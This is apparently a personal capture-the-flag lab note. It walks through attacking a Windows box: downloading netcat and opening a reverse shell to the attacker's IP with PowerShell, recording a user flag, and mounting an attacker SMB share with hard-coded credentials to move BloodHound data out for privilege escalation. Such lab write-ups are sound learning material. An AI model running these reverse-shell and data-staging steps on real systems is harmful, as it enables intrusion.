because my shell is extremely slow let's try to download nc and get a reverse shell 
![[Pasted image 20211008180120.png]]
Invoke-WebRequest -Uri <source> -OutFile destination
.\nc.exe 10.10.17.185 2239 -e powershell
![[Pasted image 20211008180055.png]]



#userflag b99ecdeac5de8eeaa16735a0a79e18b2



now let's try to upload bloodhound to the server and get the info from hound to our linux and run it and see if there is a way to do privesc 

first let's setup a smb server  [[SMB]]


then 
we create a creds so we can connect to the smb sever on the windows machine 
$pass = convertto-securestring 'exde1234' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('super1', $pass)
![[Pasted image 20211008193127.png]]
New-PSDrive -Name super -PSProvider FileSystem -Credential $cred -Root \\10.10.17.185\super